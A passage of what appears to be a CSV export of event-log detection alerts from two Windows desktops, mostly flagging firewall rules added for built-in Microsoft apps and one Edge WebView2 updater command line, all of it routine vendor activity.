+2024-01-30T07:41:14.122669+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,350,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{818C5389-FFA6-4A3B-A437-EEF0C658478A}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-30T07:41:14.123636+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,351,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{73C2F786-D680-49C6-9EB7-610494FAFBE8}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-30T07:41:14.124591+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,352,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{3F76532B-FE9A-4374-A18E-7553E160B1B2}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:14.125707+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,353,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{AAF451A5-2FE6-4339-A6C9-B6D401C28F21}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:14.126779+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,354,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D4D91F00-F692-4400-AABA-2EBA29BC3ABC}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:24.515396+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,357,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Office
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{2F080450-074C-419D-8CA1-1AF0E5560F82}'
+RuleName: Office
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:24.516438+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,358,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Office
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D53F6C17-98B3-4D2E-98BC-9514974AC6F9}'
+RuleName: Office
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:42.519198+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,367,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Microsoft3DViewer_6.1908.2042.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{1276EE08-0E87-423D-BBB7-0287DBFD1EEE}'
+RuleName: '@{Microsoft.Microsoft3DViewer_6.1908.2042.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:42.521258+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,368,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Microsoft3DViewer_6.1908.2042.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{E562C4DD-60A2-4F7F-9C34-980CC15D39C1}'
+RuleName: '@{Microsoft.Microsoft3DViewer_6.1908.2042.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:48.011719+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,373,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Getstarted_8.2.22942.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Getstarted/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{697DE02C-3067-4997-B8B8-B2BB6AD05AE3}'
+RuleName: '@{Microsoft.Getstarted_8.2.22942.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Getstarted/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:48.013793+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,374,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Getstarted_8.2.22942.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Getstarted/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{6BFD9D36-B506-4C4E-8FD5-BBD1DEA907C2}'
+RuleName: '@{Microsoft.Getstarted_8.2.22942.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Getstarted/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:50.026437+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,377,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.GetHelp_10.1706.13331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{DCEE2003-4B57-4C9F-899D-C59B633F43A2}'
+RuleName: '@{Microsoft.GetHelp_10.1706.13331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:50.031043+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,378,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.GetHelp_10.1706.13331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{2B9132F1-113C-4626-83D0-76712F1AF21C}'
+RuleName: '@{Microsoft.GetHelp_10.1706.13331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:55.037614+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,381,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.25.20211.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{294AD08A-1A3C-4A4A-8C42-185F95E24457}'
+RuleName: '@{Microsoft.BingWeather_4.25.20211.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:55.040010+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,382,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.25.20211.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D575356D-5D64-40A9-BEFD-4DD8F5DFBE15}'
+RuleName: '@{Microsoft.BingWeather_4.25.20211.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T11:12:53.823659+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,2278,DESKTOP-BNDE3TU,"CommandLine: C:\Users\TOMMYX~1\AppData\Local\Temp\EU1763.tmp\MicrosoftEdgeUpdate.exe /silent /install ""appguid={F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}&appname=Microsoft%20Edge%20Webview2%20Runtime&needsadmin=prefers""
+MandatoryLabel: S-1-16-8192
+NewProcessId: '0x1518'
+NewProcessName: C:\Users\TOMMYX~1\AppData\Local\Temp\EU1763.tmp\MicrosoftEdgeUpdate.exe
+ParentProcessName: C:\Users\tommyxiaomi\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\MicrosoftEdgeWebview2Setup.exe
+ProcessId: '0x181c'
+SubjectDomainName: DESKTOP-BNDE3TU
+SubjectLogonId: '0x4c7be'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1938'
+",
+2024-02-27T13:52:27.475662+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,398,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23110.3-0\MsMpEng.exe
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: ''
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: '*'
+LooseSourceMapped: 0
+ModifyingApplication: C:\Program Files\Windows Defender\MsMpEng.exe
+ModifyingUser: S-1-5-18
+Origin: 1
+Profiles: 2147483647
+Protocol: 6
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: '*'
+RemoteUserAuthorizationList: ''
+RuleId: '{8768F9CA-A88E-4E94-8E71-0098378ECB21}'
+RuleName: WinDefend Outbound for TCP
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: WinDefend
+",
+2024-02-27T13:59:28.044126+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,406,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Xbox Game Bar Plugin
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{10714F7F-626B-4951-88D5-064948E95B68}'
+RuleName: Xbox Game Bar Plugin
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T13:59:28.044848+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,407,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Xbox Game Bar Plugin
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{05E4DA31-5A11-4FEB-A4A0-7BEAC43F6ACC}'
+RuleName: Xbox Game Bar Plugin
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:01:15.332165+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,426,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.XboxApp_48.104.4001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxApp/XboxApp.Resource/Resources/App_Title}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B6621288-197E-496E-A593-8DB0D2086D28}'
+RuleName: '@{Microsoft.XboxApp_48.104.4001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxApp/XboxApp.Resource/Resources/App_Title}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:01:15.333501+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,427,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.XboxApp_48.104.4001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxApp/XboxApp.Resource/Resources/App_Title}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D9622EE1-5C2F-4BA6-8F43-63F07260ECE2}'
+RuleName: '@{Microsoft.XboxApp_48.104.4001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxApp/XboxApp.Resource/Resources/App_Title}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:01:50.829599+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,434,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.People_10.2202.33.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{11DEA8F5-6703-40BF-9394-A5E16B5D0864}'
+RuleName: '@{Microsoft.People_10.2202.33.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:01:50.831558+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,435,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.People_10.2202.33.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{8E751A39-C663-4011-AE38-716AB7B07291}'
+RuleName: '@{Microsoft.People_10.2202.33.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:03:38.982264+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,446,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Xbox TCUI
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D819D8F4-BF20-40C1-A999-249D3877B58C}'
+RuleName: Xbox TCUI
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:03:38.983464+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,447,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Xbox TCUI
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
